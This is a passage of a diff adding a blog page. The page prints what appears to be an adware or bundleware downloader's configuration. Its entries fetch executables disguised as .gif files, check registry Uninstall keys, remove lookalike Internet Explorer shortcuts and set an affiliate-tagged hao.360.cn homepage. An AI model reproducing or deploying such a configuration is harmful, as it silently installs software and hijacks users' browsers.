+<span class="line"><span>O_19=1</span></span>
+<span class="line"><span>D_19=..............</span></span>
+<span class="line"><span>I_19=http://down.shg20.com/shichangbu/ico/91ygame.ico</span></span>
+<span class="line"><span>U_19=http://down.shg20.com/shichangbu/91yGame-75.gif</span></span>
+<span class="line"><span>F_19=91yGame-75.exe</span></span>
+<span class="line"><span>P_19=</span></span>
+<span class="line"><span>C_19=2</span></span>
+<span class="line"><span>R_19=2</span></span>
+<span class="line"><span>S_19=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\91yGame_is1</span></span>
+<span class="line"><span>V_19=UninstallString</span></span>
+<span class="line"><span>Y_19=0</span></span>
+<span class="line"><span>L_19=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_20=........</span></span>
+<span class="line"><span>Z_20=202</span></span>
+<span class="line"><span>O_20=1</span></span>
+<span class="line"><span>D_20=............</span></span>
+<span class="line"><span>I_20=http://down.shg20.com/shichangbu/ico/kugou.ico</span></span>
+<span class="line"><span>U_20=http://xiazai.kugou.com/Corp/kugou7_3632.exe</span></span>
+<span class="line"><span>F_20=kugou7_3632.exe</span></span>
+<span class="line"><span>P_20=</span></span>
+<span class="line"><span>C_20=2</span></span>
+<span class="line"><span>R_20=2</span></span>
+<span class="line"><span>S_20=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\........</span></span>
+<span class="line"><span>V_20=UninstallString</span></span>
+<span class="line"><span>Y_20=0</span></span>
+<span class="line"><span>L_20=0</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>N_21=......</span></span>
+<span class="line"><span>Z_21=240</span></span>
+<span class="line"><span>O_21=1</span></span>
+<span class="line"><span>D_21=........</span></span>
+<span class="line"><span>I_21=http://down.shg20.com/shichangbu/ico/Dandelion.ico</span></span>
+<span class="line"><span>U_21=http://down.shg20.com/shichangbu/xyb/Dandelion.gif</span></span>
+<span class="line"><span>F_21=Dandelion.zip</span></span>
+<span class="line"><span>P_21=</span></span>
+<span class="line"><span>C_21=0</span></span>
+<span class="line"><span>Y_21=0</span></span>
+<span class="line"><span>L_21=1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[unlnk1]</span></span>
+<span class="line"><span>N_0=15</span></span>
+<span class="line"><span>N_1=&quot;Internet H&quot;</span></span>
+<span class="line"><span>N_2=&quot;Internet  &quot;</span></span>
+<span class="line"><span>N_3=&quot;Internet Expd&quot;</span></span>
+<span class="line"><span>N_4=&quot;Internet Explorert&quot;</span></span>
+<span class="line"><span>N_5=&quot;Internet D&quot;</span></span>
+<span class="line"><span>N_6=&quot;Internet .&quot;</span></span>
+<span class="line"><span>N_7=&quot;1nternet H&quot;</span></span>
+<span class="line"><span>N_8=&quot;1nternet  &quot;</span></span>
+<span class="line"><span>N_9=&quot;1nternet Expd&quot;</span></span>
+<span class="line"><span>N_10=&quot;1nternet Explorert&quot;</span></span>
+<span class="line"><span>N_11=&quot;1nternet D&quot;</span></span>
+<span class="line"><span>N_12=&quot;1nternet .&quot;</span></span>
+<span class="line"><span>N_13=&quot;Internet Explorers&quot;</span></span>
+<span class="line"><span>N_14=&quot;Internet K&quot;</span></span>
+<span class="line"><span>N_15=&quot;Internet Expu&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[unlnk2]</span></span>
+<span class="line"><span>N_0=15</span></span>
+<span class="line"><span>N_1=&quot;Internet H&quot;</span></span>
+<span class="line"><span>N_2=&quot;Internet  &quot;</span></span>
+<span class="line"><span>N_3=&quot;Internet Expd&quot;</span></span>
+<span class="line"><span>N_4=&quot;Internet Explorert&quot;</span></span>
+<span class="line"><span>N_5=&quot;Internet D&quot;</span></span>
+<span class="line"><span>N_6=&quot;Internet .&quot;</span></span>
+<span class="line"><span>N_7=&quot;1nternet H&quot;</span></span>
+<span class="line"><span>N_8=&quot;1nternet  &quot;</span></span>
+<span class="line"><span>N_9=&quot;1nternet Expd&quot;</span></span>
+<span class="line"><span>N_10=&quot;1nternet Explorert&quot;</span></span>
+<span class="line"><span>N_11=&quot;1nternet D&quot;</span></span>
+<span class="line"><span>N_12=&quot;1nternet .&quot;</span></span>
+<span class="line"><span>N_13=&quot;Internet Explorers&quot;</span></span>
+<span class="line"><span>N_14=&quot;Internet K&quot;</span></span>
+<span class="line"><span>N_15=&quot;Internet Expu&quot;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[unlnk3]</span></span>
+<span class="line"><span>N_0=5</span></span>
+<span class="line"><span>N_1=hao123..</span></span>
+<span class="line"><span>N_2=........</span></span>
+<span class="line"><span>N_3=........</span></span>
+<span class="line"><span>N_4=........</span></span>
+<span class="line"><span>N_5=Internet</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[inlnk2]</span></span>
+<span class="line"><span>N_1=1</span></span>
+<span class="line"><span>N_11=&quot;........&quot;</span></span>
+<span class="line"><span>I_11=http://down.shg20.com/shichangbu2/icon.ico</span></span>
+<span class="line"><span>H_11=http://hao.360.cn/?src=lm&amp;ls=n1e6b736897</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[dir]</span></span>
+<span class="line"><span>N_1=................</span></span>
+<span class="line"><span>H_1=http://hao.360.cn/?src=lm&amp;ls=n1e6b736897</span></span>
+<span class="line"><span>Ver=6.0.0.2</span></span>
+<span class="line"><span>GX=0</span></span>
+<span class="line"><span>PDH_1=2</span></span>
+<span class="line"><span>BSC_1=0</span></span>
+<span class="line"><span>LNKTP=1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[gen]</span></span>
+<span class="line"><span>XLSIZE=10485760</span></span>
+<span class="line"><span>X_TYPE=0</span></span>
+<span class="line"><span>QHCID=3112155</span></span>
+<span class="line"><span>QHHP=n2bb4457f9c</span></span>
+<span class="line"><span>PORT=6100</span></span>
+<span class="line"><span>YCSC=0</span></span>
+<span class="line"><span>YCHP=0</span></span>
+<span class="line"><span>XICO=0</span></span>
+<span class="line"><span>UIID=0</span></span>
+<span class="line"><span>QYHP=1</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[app230]</span></span>
+<span class="line"><span>C_1=1</span></span>
+<span class="line"><span>R_1=2</span></span>
+<span class="line"><span>S_1=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\............</span></span>
+<span class="line"><span>V_1=</span></span>
+<span class="line"><span>C_2=1</span></span>
+<span class="line"><span>R_2=2</span></span>
+<span class="line"><span>S_2=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\................</span></span>
+<span class="line"><span>V_2=</span></span>
+<span class="line"><span>C_3=1</span></span>
+<span class="line"><span>R_3=2</span></span>
+<span class="line"><span>S_3=SOFTWARE\SmartCloudInput</span></span>
+<span class="line"><span>V_3=</span></span>
+<span class="line"><span>C_4=1</span></span>
+<span class="line"><span>R_4=2</span></span>
+<span class="line"><span>S_4=SOFTWARE\SmartCloudWBInput</span></span>
+<span class="line"><span>V_4=</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[app278]</span></span>
+<span class="line"><span>C_1=1</span></span>
+<span class="line"><span>R_1=2</span></span>
+<span class="line"><span>S_1=SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\FunAccelerator</span></span>
+<span class="line"><span>V_1=</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>[mark]</span></span>
+<span class="line"><span>key=D6F776F6F17052CE8B6D4FC861D68994</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div></div><!----><!----><!----></div><footer class="vp-page-meta"><!----><div class="vp-meta-item git-info"><div class="update-time"><span class="vp-meta-label">最近更新：</span><time class="vp-meta-info" datetime="2024-09-29T15:21:40.000Z" data-allow-mismatch>2024/9/29 15:21</time></div><div class="contributors"><span class="vp-meta-label">贡献者: </span><!--[--><!--[--><span class="vp-meta-info" title="email: root@vistazx1.top">root</span><!--]--><!--]--></div></div></footer><!----><!----><!----><!--]--></main><!--]--><footer class="vp-footer-wrapper" vp-footer><div class="vp-footer">Don't think about what came after or what came before</br>You've just gotta bend your knees, take a deep breath and jump</div><div class="vp-copyright">Copyright © 2025 Guohao </div></footer></div><!--]--><!--[--><!----><!----><!--[--><!--]--><!--]--><!--]--></div>
+    <script type="module" src="/assets/app-CJlMl9Ja.js" defer></script>
+  </body>
+</html>
